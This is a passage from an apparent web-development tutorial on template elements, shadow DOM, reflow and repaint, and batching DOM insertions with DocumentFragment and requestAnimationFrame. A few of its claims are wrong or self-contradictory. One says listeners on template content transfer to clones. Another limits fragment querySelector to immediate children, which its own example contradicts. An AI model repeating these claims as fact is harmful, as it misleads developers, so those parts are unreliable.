Deep cloning (`cloneNode(true)`) copies the entire subtree. Each clone is independent—modifications to one don't affect others or the template source. This enables efficient instantiation of repeated structures without repetitive parsing.

### DocumentFragment Behavior

The `content` property returns a `DocumentFragment`, which behaves differently from standard DOM nodes. When appending a fragment to the DOM, the fragment itself doesn't get inserted—only its children transfer to the destination. The fragment becomes empty after insertion:

```javascript
const fragment = template.content.cloneNode(true);
console.log(fragment.childNodes.length); // e.g., 3

document.body.appendChild(fragment);
console.log(fragment.childNodes.length); // 0
```

This "self-consuming" behavior makes fragments efficient for batch DOM operations. If you need to insert the same content multiple times, clone the template multiple times rather than reusing a single fragment.

### Template Content Isolation

Content inside templates exists in a separate document context. Query selectors from the main document cannot find elements inside template content:

```javascript
// This returns null
document.querySelector('.card-title'); 

// This works
template.content.querySelector('.card-title');
```

Event listeners attached to template content before cloning transfer to each clone. Listeners attached after cloning affect only that specific instance. This isolation prevents unintended interactions between template definitions and active document content.

### Nested Templates

Templates can contain other templates, creating hierarchical template structures:

```html
<template id="list-template">
  <ul class="item-list">
    <template id="item-template">
      <li class="item"></li>
    </template>
  </ul>
</template>
```

Accessing nested templates requires navigating through the parent's content:

```javascript
const listTemplate = document.getElementById('list-template');
const itemTemplate = listTemplate.content.getElementById('item-template');

// Clone outer template
const list = listTemplate.content.cloneNode(true);

// Clone and populate inner template multiple times
for (let i = 0; i < 5; i++) {
  const item = itemTemplate.content.cloneNode(true);
  item.querySelector('.item').textContent = `Item ${i}`;
  list.querySelector('.item-list').appendChild(item);
}
```

Nested templates maintain their inert state until explicitly activated, even when their parent template is cloned.

### Custom Element Integration

Templates integrate naturally with custom elements through shadow DOM attachment:

```javascript
class CardComponent extends HTMLElement {
  constructor() {
    super();
    const template = document.getElementById('card-template');
    const content = template.content.cloneNode(true);
    
    this.attachShadow({ mode: 'open' });
    this.shadowRoot.appendChild(content);
  }
}

customElements.define('card-component', CardComponent);
```

This pattern encapsulates template content within component boundaries. Each component instance receives an independent clone, preventing cross-component interference. Template content can include `<slot>` elements for content projection.

### Performance Characteristics

Template cloning is significantly faster than parsing HTML strings or creating elements imperatively. The browser parses template content once during page load, then clones the pre-parsed structure for each instance. Benchmarks typically show 3-10x performance improvements over `innerHTML` for repeated element creation.

[Inference: The specific performance multiplier varies based on template complexity, browser implementation, and hardware.]

Memory-wise, templates occupy space for both the inert definition and each active clone. For large, rarely-used templates, consider lazy-loading the template content or using dynamic `innerHTML` insertion instead.

### Declarative Shadow DOM

Templates support declarative shadow DOM through the `shadowrootmode` attribute:

```html
<host-element>
  <template shadowrootmode="open">
    <style>
      p { color: blue; }
    </style>
    <p>Shadow content</p>
  </template>
</host-element>
```

The browser automatically attaches the template content as the element's shadow root during parsing. This eliminates the need for JavaScript to create shadow roots imperatively, enabling server-rendered web components with encapsulated styles.

[Inference: Browser support for declarative shadow DOM is expanding but may require fallbacks for older browsers.]

### Script Execution Timing

Scripts inside templates don't execute until their containing content is inserted into the document. This includes both inline and external scripts:

```html
<template id="script-template">
  <script>
    console.log('This runs only after insertion');
  </script>
</template>
```

Scripts execute in document order after insertion. If a template contains multiple scripts, they run sequentially. Dynamic script creation within template content follows standard script loading and execution rules once activated.

### Style Element Behavior

Style elements within templates remain inert until cloning and insertion. Styles don't apply to template content or to the document until the template is activated:

```html
<template id="styled-template">
  <style>
    .highlight { background: yellow; }
  </style>
  <div class="highlight">Styled content</div>
</template>
```

When cloned into the document, styles apply according to their insertion point. If inserted into a shadow root, styles are scoped to that shadow tree. If inserted into the main document, styles are global unless otherwise scoped.

### Slot and Template Interaction

Templates can define slot structures for later content projection:

```html
<template id="slot-template">
  <div class="container">
    <slot name="header"></slot>
    <slot></slot>
    <slot name="footer"></slot>
  </div>
</template>
```

Slots remain as placeholder elements until the template is used within a shadow DOM context where slotted content is available. The slot mechanism activates only after shadow root attachment and slottable content presence.

### Template Modification Strategies

Modifying template content before cloning affects all subsequent clones:

```javascript
const template = document.getElementById('base-template');

// Permanent modification
template.content.querySelector('.title').textContent = 'New Default';

// All future clones have this change
const clone1 = template.content.cloneNode(true);
const clone2 = template.content.cloneNode(true);
```

For instance-specific modifications, clone first, then modify:

```javascript
const clone = template.content.cloneNode(true);
clone.querySelector('.title').textContent = 'Instance Specific';
document.body.appendChild(clone);
```

Modifying templates at runtime enables dynamic template systems where templates adapt based on application state or user preferences.

### Template Accessibility

Inert template content doesn't participate in accessibility trees. Screen readers and assistive technologies ignore template definitions. Only after cloning and insertion does content become accessible:

```html
<template id="accessible-template">
  <button aria-label="Action Button">Click</button>
</template>
```

Ensure accessibility attributes are present in template definitions, as they'll apply to each clone. Dynamic ARIA attributes should be added post-cloning based on instance context.

### Form Element State

Form elements within templates initialize with default values. When cloned, each instance receives a fresh form element with the template's defined defaults:

```html
<template id="form-template">
  <input type="text" value="default">
  <input type="checkbox" checked>
</template>
```

User interactions with one cloned form don't affect other clones or the template source. Each instance maintains independent form state. Programmatically setting values must occur after cloning.

### Template and CSP

Content Security Policy (CSP) restrictions apply to template content once activated. Inline scripts within templates face the same CSP constraints as other inline scripts:

```html
<template id="csp-template">
  <script>
    // This script respects CSP after insertion
    console.log('CSP applies here');
  </script>
</template>
```

[Inference: The specific CSP behavior depends on the site's CSP directives and whether nonces or hashes are used.]

Templates themselves don't violate CSP during parsing since their content remains inert. CSP evaluation occurs at activation time when content enters the live document.

---

## Shadow DOM Basics

### Encapsulation Mechanism

Shadow DOM creates an isolated DOM subtree attached to an element, separated from the main document tree. The shadow root serves as the boundary between the shadow tree and the light DOM (regular document DOM). This encapsulation prevents styles and scripts from leaking in or out, though certain properties like inherited CSS properties do cross the boundary.

### Creating Shadow Roots

Attach a shadow root using `element.attachShadow({mode: 'open'})` or `{mode: 'closed'}`. Open mode allows external JavaScript to access the shadow root via `element.shadowRoot`. Closed mode returns `null` for this property, though this provides limited security since references can still be captured during creation.

```javascript
const host = document.querySelector('#my-element');
const shadowRoot = host.attachShadow({mode: 'open'});
shadowRoot.innerHTML = '<p>Shadow content</p>';
```

Not all elements can host shadow DOM. Valid hosts include custom elements, `<article>`, `<aside>`, `<blockquote>`, `<body>`, `<div>`, `<footer>`, `<h1>`-`<h6>`, `<header>`, `<main>`, `<nav>`, `<p>`, `<section>`, `<span>`.

### Shadow Tree Structure

The shadow tree consists of:

- **Shadow host**: The regular DOM element hosting the shadow root
- **Shadow root**: The root node of the shadow tree
- **Shadow tree**: The internal DOM structure
- **Shadow boundary**: The conceptual barrier between shadow and light DOM

### Style Encapsulation

Styles defined inside shadow DOM don't affect the outer document, and external styles (mostly) don't affect shadow content. Style encapsulation works through:

**Internal styles**: Defined within the shadow root using `<style>` tags or constructed stylesheets.

```javascript
shadowRoot.innerHTML = `
  <style>
    p { color: blue; }
  </style>
  <p>This is blue only in shadow DOM</p>
`;
```

**:host selector**: Targets the shadow host from inside the shadow DOM.

```css
:host {
  display: block;
  border: 1px solid black;
}

:host(.special) {
  border-color: red;
}

:host-context(.dark-theme) {
  background: black;
}
```

**Inheritance**: Properties like `color`, `font`, and other inherited CSS properties do cross the shadow boundary from host to shadow tree.

### Slots and Composition

Slots enable content projection from light DOM into shadow DOM, creating composition points.

**Named slots**: Use the `name` attribute to create specific insertion points.

```javascript
// Shadow DOM
shadowRoot.innerHTML = `
  <div class="card">
    <slot name="header"></slot>
    <slot></slot>
    <slot name="footer"></slot>
  </div>
`;

// Light DOM usage
<my-card>
  <h2 slot="header">Title</h2>
  <p>Default slot content</p>
  <button slot="footer">OK</button>
</my-card>
```

**Default slot**: An unnamed `<slot>` receives all light DOM children not assigned to named slots.

**Slot fallback**: Content inside `<slot>` tags displays when no light DOM content is slotted.

```javascript
shadowRoot.innerHTML = `<slot>Default fallback text</slot>`;
```

### Event Retargeting

Events that originate in shadow DOM get retargeted when they cross the shadow boundary. The `event.target` property changes to reference the shadow host rather than the actual element inside shadow DOM. This maintains encapsulation by hiding internal implementation details.

```javascript
shadowRoot.innerHTML = '<button>Click me</button>';

host.addEventListener('click', (e) => {
  console.log(e.target); // Logs the host, not the button
  console.log(e.composedPath()); // Shows full path including shadow internals
});
```

**Composed events**: Some events have `composed: true` and bubble through shadow boundaries (like `click`, `input`, `focus`). Others stay contained (like `load`, `error` on some elements).

### Parts and Themes

The `::part()` pseudo-element allows styling specific shadow DOM elements from outside, creating controlled style extension points.

```javascript
// Inside shadow DOM
shadowRoot.innerHTML = `
  <div part="container">
    <button part="button">Click</button>
  </div>
`;

// External CSS can style these
my-element::part(container) {
  padding: 20px;
}

my-element::part(button) {
  background: blue;
}
```

### Declarative Shadow DOM

Declarative Shadow DOM allows defining shadow roots in HTML without JavaScript, useful for server-side rendering.

```html
<my-element>
  <template shadowrootmode="open">
    <style>p { color: red; }</style>
    <p>Shadow content</p>
  </template>
</my-element>
```

The browser automatically attaches the template content as a shadow root. This feature has limited browser support and requires polyfills for older browsers.

### CSS Shadow Parts Forwarding

Shadow DOM can forward parts to outer contexts using the `exportparts` attribute, enabling multi-level component styling.

```javascript
// Inner component
innerShadow.innerHTML = '<button part="btn">Click</button>';

// Outer component forwards the part
outerShadow.innerHTML = `
  <inner-component exportparts="btn: inner-btn"></inner-component>
`;

// Now external CSS can style it
outer-component::part(inner-btn) {
  color: green;
}
```

### Constructable Stylesheets

Constructable stylesheets provide a performance-optimized way to share styles across multiple shadow roots.

```javascript
const sheet = new CSSStyleSheet();
sheet.replaceSync('p { color: blue; }');

shadowRoot.adoptedStyleSheets = [sheet];
// The same sheet instance can be reused across multiple shadow roots
```

This avoids parsing the same CSS multiple times and reduces memory usage when creating many similar components.

---

# Performance Optimization

## Reflow and Repaint

### Core Mechanisms

**Reflow** (also called layout) is the process where the browser calculates the positions and dimensions of elements in the document. This involves computing the geometry of the render tree—determining where each element sits and how much space it occupies based on the CSS box model, positioning properties, and content.

**Repaint** (also called redraw) is the process where the browser fills in pixels for visual properties that don't affect layout. This involves drawing text, colors, images, borders, shadows, and other visual properties to the screen.

### Critical Distinction

Reflows always trigger repaints because changing element geometry requires redrawing the affected areas. However, repaints can occur without reflows when only visual properties change (like `color`, `background-color`, `visibility`).

### Reflow Triggers

**Geometric property changes:**

- Width, height, margin, padding, border
- Position (top, left, right, bottom)
- Display property changes
- Float and clear operations

**Content modifications:**

- Text content changes
- Image dimension changes
- Adding/removing DOM nodes
- Font-size adjustments

**Layout queries (forced synchronous layout):**

- `offsetWidth`, `offsetHeight`, `offsetTop`, `offsetLeft`
- `scrollTop`, `scrollWidth`, `scrollHeight`
- `clientWidth`, `clientHeight`
- `getComputedStyle()`
- `getBoundingClientRect()`

When JavaScript reads these properties, the browser must ensure layout calculations are current, potentially triggering immediate reflow.

**Window operations:**

- Resizing the viewport
- Changing device orientation
- Scrolling (can trigger reflows for fixed/sticky positioned elements)
- Font loading completion

**CSS changes:**

- Adding/removing stylesheets
- Modifying CSS rules
- Pseudo-class changes (`:hover`, `:focus`)

### Repaint-Only Triggers

Properties that affect appearance without geometry:

- `color`
- `background-color`, `background-image`
- `visibility` (note: `display: none` triggers reflow)
- `outline` and `outline-color`
- `box-shadow` (non-expanding)
- `opacity` changes (though GPU-accelerated properties may avoid even repaint)

### Propagation and Scope

**Local vs. Global Reflows:**

- Local reflows affect a subtree of the DOM when changes are constrained by layout boundaries
- Global reflows recalculate layout for the entire document or large portions

**Reflow propagation patterns:**

- Changes to parent elements often trigger reflows of descendants
- Sibling elements may reflow if they're in normal flow and affected by dimension changes
- Absolutely positioned elements have limited reflow impact on siblings
- Fixed positioning removes elements from normal flow, reducing propagation

### Browser Optimization Strategies

**Reflow batching:** Browsers queue DOM and style changes, then execute them in batches during the next repaint cycle. This amortizes the cost across multiple changes.

**Dirty bit system:** Browsers mark affected elements as "dirty" and only recalculate those portions during reflow operations rather than the entire tree.

**Incremental reflow:** Modern browsers can perform partial reflows on specific subtrees when changes are isolated, avoiding full document recalculation.

**Layout boundaries:** Certain elements establish layout containment boundaries (like `overflow: hidden` containers or elements with fixed dimensions), limiting reflow scope.

### Performance Characteristics

**Computational complexity:** Reflow is computationally expensive because it involves recursive tree traversal and geometric calculations. Complex selectors, deep DOM trees, and intricate layouts amplify this cost.

**Timing considerations:**

- Reflows are synchronous and block the main thread
- Multiple reflows within a single JavaScript execution can compound performance issues
- Layout thrashing occurs when alternating reads and writes force multiple synchronous reflows

### Layout Thrashing Pattern

```javascript
// Anti-pattern: causes multiple reflows
for (let i = 0; i < elements.length; i++) {
  const height = elements[i].offsetHeight; // read (reflow)
  elements[i].style.height = height + 10 + 'px'; // write (invalidates layout)
}

// Optimized: batch reads, then writes
const heights = [];
for (let i = 0; i < elements.length; i++) {
  heights[i] = elements[i].offsetHeight; // batch reads
}
for (let i = 0; i < elements.length; i++) {
  elements[i].style.height = heights[i] + 10 + 'px'; // batch writes
}
```

### Mitigation Techniques

**Batch DOM modifications:**

- Use DocumentFragment for multiple insertions
- Clone nodes, modify offline, then replace
- Use `innerHTML` for bulk content changes instead of incremental DOM manipulation

**Cache layout values:** Store computed dimensions in variables rather than repeatedly querying the DOM.

**Minimize layout queries:** Avoid reading layout properties inside loops or during animations.

**CSS class toggling:** Change classes rather than individual style properties to leverage browser optimizations.

**Detachment strategy:** Remove elements from the DOM tree using `display: none` or `removeChild()`, modify them, then reattach.

**CSS containment:** Use `contain: layout` to establish containment boundaries and prevent reflow propagation.

**Transform and opacity for animations:** These properties can be GPU-accelerated and bypass layout/paint in the compositor thread.

### Compositor-Only Properties

Modern browsers can handle certain properties entirely on the compositor thread, avoiding main-thread reflow/repaint:

- `transform` (translate, rotate, scale)
- `opacity`
- `filter` (with GPU support)

These changes occur on a separate layer and don't require recalculation of layout or paint operations on the main thread.

### Layer Promotion

**When browsers create layers:**

- Elements with `will-change` property
- 3D transforms or perspective
- `<video>` and `<canvas>` elements
- Elements with CSS filters
- Overlapping with other composited elements

**Layer implications:** Promoted layers enable hardware acceleration but consume GPU memory. Over-promotion can degrade performance.

### Developer Tools Integration

**Performance profiling:** Browser DevTools provide timeline/performance panels showing:

- Reflow events (Layout in Chrome, Reflow in Firefox)
- Paint operations
- Composite layer updates
- JavaScript execution triggering layout

**Layer visualization:** Chrome DevTools offers layer borders and compositing indicators to identify which elements are on separate layers.

**Layout shift metrics:** Cumulative Layout Shift (CLS) quantifies visual stability by measuring unexpected layout changes during page lifetime.

### Framework-Specific Considerations

**Virtual DOM libraries:** React and similar frameworks batch updates and minimize direct DOM manipulation, inherently reducing reflow frequency.

**Change detection:** Angular's zone.js triggers digest cycles that can bundle multiple DOM updates, though this doesn't prevent reflows from geometric queries within the cycle.

**Reactive systems:** Vue and Svelte compile templates to efficient update strategies, but developers must still avoid layout thrashing in imperative code.

### CSS Properties Impact Matrix

**High-cost properties (trigger reflow + repaint):**

- Width, height, position, display, float, margin, padding, border-width, font-size, line-height, vertical-align

**Medium-cost properties (trigger repaint only):**

- Color, background, border-color, border-style, box-shadow, text-decoration, visibility, outline

**Low-cost properties (compositor only, [Inference: based on GPU acceleration support]):**

- Transform, opacity, filter (when accelerated)

### Mobile and Resource-Constrained Considerations

Mobile devices have:

- Less CPU power for layout calculations
- Limited GPU memory for layer promotion
- Higher sensitivity to main-thread blocking
- Battery consumption concerns with excessive reflows

Reflow optimization is more critical on mobile platforms where performance budgets are tighter.

### Interaction with Other Systems

**Intersection Observer:** Provides an asynchronous way to observe element visibility changes without forced synchronous layout from scroll event handlers.

**Resize Observer:** Enables detection of element size changes without polling `getBoundingClientRect()`, reducing forced reflows.

**Mutation Observer:** Monitors DOM changes but doesn't prevent the reflows those changes cause—it only provides notification hooks.

---

## Batch DOM Operations

### Core Concept

Batch DOM operations involve grouping multiple Document Object Model manipulations into a single execution phase to minimize browser reflows and repaints. Each time the DOM is modified, the browser may recalculate layout (reflow) and redraw affected elements (repaint), which are computationally expensive operations. Batching reduces these costs by performing multiple changes before triggering the rendering pipeline.

### Reflow and Repaint Mechanics

#### Reflow Triggers

Reflows occur when changes affect element geometry or position:

- Modifying element dimensions (width, height, padding, margin, border)
- Changing CSS properties that affect layout (display, position, float)
- Adding or removing DOM nodes
- Changing text content that affects dimensions
- Reading layout properties (offsetHeight, clientWidth, getBoundingClientRect)
- Modifying CSS classes that contain layout-affecting properties
- Window resizing or font changes

#### Repaint Triggers

Repaints occur when visual properties change without affecting layout:

- Color changes (background-color, color, border-color)
- Visibility changes (visibility, opacity)
- Box shadow modifications
- Text decoration changes

Reflows are significantly more expensive than repaints because they require recalculating the geometry of affected elements and their descendants.

### DocumentFragment for Batch Insertions

`DocumentFragment` serves as a lightweight container for DOM nodes that exists outside the main DOM tree. Nodes can be assembled within the fragment and then inserted into the document in a single operation.

```javascript
const fragment = document.createDocumentFragment();

for (let i = 0; i < 1000; i++) {
  const div = document.createElement('div');
  div.textContent = `Item ${i}`;
  fragment.appendChild(div);
}

// Single reflow instead of 1000
container.appendChild(fragment);
```

When the fragment is appended, all its child nodes transfer to the target container in one operation, triggering only one reflow instead of one per insertion.

### Detaching Elements During Modifications

Removing an element from the DOM before making multiple modifications prevents intermediate reflows:

```javascript
const element = document.getElementById('target');
const parent = element.parentNode;
const next = element.nextSibling;

// Detach from DOM
parent.removeChild(element);

// Make multiple modifications
element.style.width = '200px';
element.style.height = '150px';
element.classList.add('modified');
element.innerHTML = '<span>New content</span>';

// Reinsert in one operation
parent.insertBefore(element, next);
```

While detached, modifications don't trigger reflows because the element isn't part of the rendered tree.

### CSS Class Batching

Changing individual CSS properties triggers multiple reflows. Applying a pre-defined CSS class with all desired properties triggers only one:

```javascript
// Multiple reflows
element.style.width = '200px';
element.style.height = '150px';
element.style.backgroundColor = 'blue';
element.style.padding = '10px';

// Single reflow
element.className = 'batch-styled';
```

The CSS class approach also separates styling concerns from JavaScript logic.

### Read-Write Batching Pattern

Interleaving read and write operations forces synchronous layout calculations. Batching all reads before writes prevents forced synchronous layouts:

```javascript
// Poor: Interleaved reads and writes
const h1 = element1.offsetHeight; // Read (triggers layout)
element1.style.height = h1 * 2 + 'px'; // Write
const h2 = element2.offsetHeight; // Read (triggers layout again)
element2.style.height = h2 * 2 + 'px'; // Write

// Optimized: Batch reads, then batch writes
const h1 = element1.offsetHeight; // Read
const h2 = element2.offsetHeight; // Read
element1.style.height = h1 * 2 + 'px'; // Write
element2.style.height = h2 * 2 + 'px'; // Write
```

This pattern reduces forced synchronous layouts from multiple instances to one.

### requestAnimationFrame for Visual Updates

`requestAnimationFrame` schedules callbacks before the next repaint, allowing the browser to batch DOM changes within a single rendering frame:

```javascript
function batchUpdate() {
  requestAnimationFrame(() => {
    element1.style.transform = 'translateX(100px)';
    element2.style.opacity = '0.5';
    element3.classList.add('active');
    // All changes applied before next paint
  });
}
```

Multiple `requestAnimationFrame` callbacks scheduled in the same JavaScript execution context will execute in the same frame, further consolidating rendering work.

### Virtual DOM Pattern

Virtual DOM implementations maintain an in-memory representation of the DOM tree. Changes are applied to the virtual representation, differences are calculated, and only the minimal set of actual DOM operations is performed:

```javascript
// Conceptual virtual DOM batch operation
const updates = [
  { type: 'update', node: element1, property: 'textContent', value: 'New' },
  { type: 'update', node: element2, property: 'className', value: 'active' },
  { type: 'remove', node: element3 },
  { type: 'insert', parent: container, node: newElement }
];

// Process all updates, calculate diff, apply minimal changes
applyBatchedUpdates(updates);
```

This approach is the foundation of frameworks like React and Vue, which handle batching automatically.

### Display: None Technique

Setting `display: none` removes an element from the rendering tree entirely. While in this state, modifications don't trigger reflows:

```javascript
element.style.display = 'none';

// Multiple modifications with no reflow
for (let i = 0; i < 100; i++) {
  const child = document.createElement('div');
  element.appendChild(child);
}

element.style.display = 'block'; // Single reflow when restored
```

This technique is effective for complex DOM restructuring but causes the element to briefly disappear if visible.

### CSS Transform and Opacity Optimization

Certain CSS properties (transform, opacity) are optimized by browsers to run on the compositor thread without triggering layout or paint on the main thread:

```javascript
// Composite-only properties (no reflow/repaint)
element.style.transform = 'translateX(100px) scale(1.2)';
element.style.opacity = '0.8';

// Layout-affecting properties (triggers reflow)
element.style.left = '100px';
element.style.width = '120%';
```

Batching changes to composite-only properties still has benefits for JavaScript execution efficiency, but the rendering cost is already minimal.

### innerHTML vs createElement Batch Performance

For creating multiple elements, `innerHTML` can be faster than repeated `createElement` calls because it parses HTML in a single operation:

```javascript
// Multiple createElement calls
const container = document.getElementById('container');
for (let i = 0; i < 100; i++) {
  const div = document.createElement('div');
  div.textContent = `Item ${i}`;
  container.appendChild(div); // 100 reflows
}

// Single innerHTML assignment
let html = '';
for (let i = 0; i < 100; i++) {
  html += `<div>Item ${i}</div>`;
}
container.innerHTML = html; // 1 reflow
```

[Inference] The `innerHTML` approach may have security implications if content includes user input (XSS risks) and doesn't preserve event listeners on existing elements.

### Measuring Batch Operation Performance

The Performance API can measure the impact of batching strategies:

```javascript
performance.mark('batch-start');

// Perform batched operations
const fragment = document.createDocumentFragment();
for (let i = 0; i < 1000; i++) {
  const div = document.createElement('div');
  fragment.appendChild(div);
}
container.appendChild(fragment);

performance.mark('batch-end');
performance.measure('batch-operation', 'batch-start', 'batch-end');

const measure = performance.getEntriesByName('batch-operation')[0];
console.log(`Duration: ${measure.duration}ms`);
```

Chrome DevTools Performance panel can visualize reflow and repaint events, showing the concrete impact of batching strategies.

### Framework-Level Batching

Modern frameworks implement automatic batching mechanisms:

**React 18+ Automatic Batching**: Multiple state updates within event handlers, promises, and timeouts are automatically batched into a single re-render.

**Vue 3 Async Update Queue**: Changes to reactive data are queued and flushed asynchronously, batching multiple updates into a single DOM patch operation.

**Angular Change Detection**: Zone.js batches multiple operations that occur within a single turn of the JavaScript event loop.

These frameworks abstract the batching complexity from developers while providing escape hatches when immediate updates are necessary.

### Web Workers for Non-DOM Computation

While Web Workers cannot directly manipulate the DOM, they can perform computation that prepares data structures for batch DOM operations on the main thread:

```javascript
// In worker
self.onmessage = (e) => {
  const data = e.data;
  const processed = performHeavyComputation(data);
  self.postMessage(processed);
};

// On main thread
worker.onmessage = (e) => {
  const results = e.data;
  
  // Single batch operation with pre-computed data
  const fragment = document.createDocumentFragment();
  results.forEach(item => {
    const div = document.createElement('div');
    div.textContent = item.text;
    fragment.appendChild(div);
  });
  container.appendChild(fragment);
};
```

This separates computation from rendering, ensuring the main thread remains responsive.

### Throttling and Debouncing for Event-Driven Batching

High-frequency events (scroll, resize, mousemove) benefit from batching through throttling or debouncing:

```javascript
let pending = [];

function throttledBatch() {
  if (pending.length === 0) return;
  
  requestAnimationFrame(() => {
    const fragment = document.createDocumentFragment();
    pending.forEach(item => {
      const div = document.createElement('div');
      div.textContent = item;
      fragment.appendChild(div);
    });
    container.appendChild(fragment);
    pending = [];
  });
}

// Collect operations during scroll
window.addEventListener('scroll', () => {
  pending.push(`Scroll position: ${window.scrollY}`);
  throttledBatch();
});
```

This ensures DOM updates occur at most once per frame regardless of event frequency.

---

## DocumentFragment for Multiple Insertions

## Core Mechanism

DocumentFragment serves as a lightweight container that holds DOM nodes outside the main document tree. When appended to the DOM, only its children are inserted while the fragment itself remains empty and reusable. This eliminates the reflow and repaint costs associated with multiple individual insertions.

```javascript
const fragment = document.createDocumentFragment();

// Build structure in memory
for (let i = 0; i < 1000; i++) {
  const div = document.createElement('div');
  div.textContent = `Item ${i}`;
  fragment.appendChild(div);
}

// Single DOM insertion
container.appendChild(fragment);
```

## Performance Characteristics

### Reflow and Repaint Reduction

Each direct DOM insertion triggers layout recalculation. DocumentFragment batches these operations into a single insertion point:

```javascript
// Poor: 100 reflows
for (let i = 0; i < 100; i++) {
  container.appendChild(document.createElement('div'));
}

// Optimized: 1 reflow
const fragment = document.createDocumentFragment();
for (let i = 0; i < 100; i++) {
  fragment.appendChild(document.createElement('div'));
}
container.appendChild(fragment);
```

### Memory Efficiency

DocumentFragment maintains minimal overhead compared to creating temporary container elements:

```javascript
// Uses temporary container (more memory)
const temp = document.createElement('div');
temp.innerHTML = generateLargeHTML();
while (temp.firstChild) {
  container.appendChild(temp.firstChild);
}

// DocumentFragment approach
const fragment = document.createDocumentFragment();
const temp = document.createElement('div');
temp.innerHTML = generateLargeHTML();
while (temp.firstChild) {
  fragment.appendChild(temp.firstChild);
}
container.appendChild(fragment);
```

## Advanced Patterns

### Complex Nested Structures

Build hierarchical DOM structures efficiently:

```javascript
function createComplexStructure(data) {
  const fragment = document.createDocumentFragment();
  
  data.forEach(item => {
    const card = document.createElement('div');
    card.className = 'card';
    
    const header = document.createElement('header');
    header.textContent = item.title;
    
    const body = document.createElement('div');
    body.className = 'card-body';
    
    const list = document.createElement('ul');
    item.items.forEach(subItem => {
      const li = document.createElement('li');
      li.textContent = subItem;
      list.appendChild(li);
    });
    
    body.appendChild(list);
    card.appendChild(header);
    card.appendChild(body);
    fragment.appendChild(card);
  });
  
  return fragment;
}

container.appendChild(createComplexStructure(largeDataset));
```

### Cloning for Reuse

DocumentFragment can be cloned to create multiple identical structures:

```javascript
const template = document.createDocumentFragment();
const baseStructure = document.createElement('div');
baseStructure.className = 'template';
baseStructure.innerHTML = '<span class="label"></span><input type="text">';
template.appendChild(baseStructure);

// Clone and customize multiple times
for (let i = 0; i < 50; i++) {
  const clone = template.cloneNode(true);
  clone.querySelector('.label').textContent = `Field ${i}`;
  container.appendChild(clone);
}
```

### Event Delegation Setup

Attach event listeners before insertion to avoid traversal overhead:

```javascript
const fragment = document.createDocumentFragment();
const wrapper = document.createElement('div');
wrapper.className = 'button-group';

wrapper.addEventListener('click', (e) => {
  if (e.target.matches('button')) {
    handleButtonClick(e.target.dataset.id);
  }
});

for (let i = 0; i < 100; i++) {
  const button = document.createElement('button');
  button.dataset.id = i;
  button.textContent = `Button ${i}`;
  wrapper.appendChild(button);
}

fragment.appendChild(wrapper);
container.appendChild(fragment);
```

## Integration with Template Elements

Combine with `<template>` for declarative fragment creation:

```javascript
const template = document.getElementById('row-template');
const fragment = document.createDocumentFragment();

data.forEach(item => {
  const clone = template.content.cloneNode(true);
  clone.querySelector('.name').textContent = item.name;
  clone.querySelector('.value').textContent = item.value;
  fragment.appendChild(clone);
});

table.appendChild(fragment);
```

## Range-Based Fragment Creation

Use Range API for efficient fragment creation from HTML strings:

```javascript
function createFragmentFromHTML(htmlString) {
  const range = document.createRange();
  range.selectNode(document.body);
  return range.createContextualFragment(htmlString);
}

const fragment = createFragmentFromHTML(`
  <div class="item">Item 1</div>
  <div class="item">Item 2</div>
  <div class="item">Item 3</div>
`);

container.appendChild(fragment);
```

## Comparison with Alternatives

### innerHTML Replacement

```javascript
// Destroys existing event listeners and state
container.innerHTML = generateHTML();

// Preserves existing content and listeners
const fragment = document.createDocumentFragment();
// ... build fragment
container.appendChild(fragment);
```

### insertAdjacentHTML

```javascript
// String-based, no node manipulation before insertion
container.insertAdjacentHTML('beforeend', htmlString);

// Programmatic node creation and manipulation
const fragment = document.createDocumentFragment();
// ... manipulate nodes before insertion
container.appendChild(fragment);
```

## Virtual Scrolling Integration

DocumentFragment works efficiently with virtual scrolling implementations:

```javascript
function renderVisibleItems(startIndex, endIndex, data) {
  const fragment = document.createDocumentFragment();
  
  for (let i = startIndex; i < endIndex; i++) {
    const item = document.createElement('div');
    item.className = 'virtual-item';
    item.style.transform = `translateY(${i * itemHeight}px)`;
    item.textContent = data[i];
    fragment.appendChild(item);
  }
  
  viewport.innerHTML = ''; // Clear previous items
  viewport.appendChild(fragment);
}
```

## Limitations and Considerations

### No Document Context

Nodes in a fragment lack document context until inserted. Properties like `offsetWidth` and computed styles return zero:

```javascript
const fragment = document.createDocumentFragment();
const div = document.createElement('div');
fragment.appendChild(div);

console.log(div.offsetWidth); // 0 - no layout context

container.appendChild(fragment);
console.log(div.offsetWidth); // Actual computed width
```

### querySelector Scope

DocumentFragment supports querySelector but only within its immediate children:

```javascript
const fragment = document.createDocumentFragment();
const parent = document.createElement('div');
const child = document.createElement('span');
child.id = 'target';
parent.appendChild(child);
fragment.appendChild(parent);

fragment.querySelector('#target'); // Works
```

### Single-Use Nature After Append

After appending, the fragment empties automatically:

```javascript
const fragment = document.createDocumentFragment();
fragment.appendChild(document.createElement('div'));

container1.appendChild(fragment);
console.log(fragment.childNodes.length); // 0

// Must rebuild for subsequent insertions
container2.appendChild(fragment); // Inserts nothing
```

## Batch Operations Pattern

Combine with requestAnimationFrame for optimal rendering:

```javascript
function batchInsert(items, container, batchSize = 50) {
  let index = 0;
  
  function processBatch() {
    const fragment = document.createDocumentFragment();
    const end = Math.min(index + batchSize, items.length);
    
    for (; index < end; index++) {
      const element = createElementFromItem(items[index]);
      fragment.appendChild(element);
    }
    
    container.appendChild(fragment);
    
    if (index < items.length) {
      requestAnimationFrame(processBatch);
    }
  }
  
  processBatch();
}
```

## Memory Management

DocumentFragment nodes are garbage collected when no longer referenced:

```javascript
function createAndInsert() {
  const fragment = document.createDocumentFragment();
  
  for (let i = 0; i < 1000; i++) {
    fragment.appendChild(document.createElement('div'));
  }
  
  container.appendChild(fragment);
  // fragment is now empty and eligible for GC
}
```

## Testing and Debugging

Inspect fragment contents before insertion:

```javascript
const fragment = document.createDocumentFragment();
// ... build fragment

// Debug: serialize to inspect structure
const temp = document.createElement('div');
temp.appendChild(fragment.cloneNode(true));
console.log(temp.innerHTML);

// Now insert the actual fragment
container.appendChild(fragment);
```

---

## requestAnimationFrame

### Execution Timing and the Browser Event Loop

`requestAnimationFrame` operates within the browser's rendering pipeline, scheduled to execute before the next repaint. The callback fires approximately 60 times per second on 60Hz displays, but crucially adapts to the display's refresh rate—120Hz on high-refresh monitors, or throttled to lower rates when the tab is inactive or the device is resource-constrained.

The callback receives a single `DOMHighResTimeStamp` parameter representing the time the callback queue began processing. This timestamp originates from `performance.now()` and represents milliseconds elapsed since time origin, providing sub-millisecond precision for accurate frame timing calculations.

```javascript
let lastTime = 0;
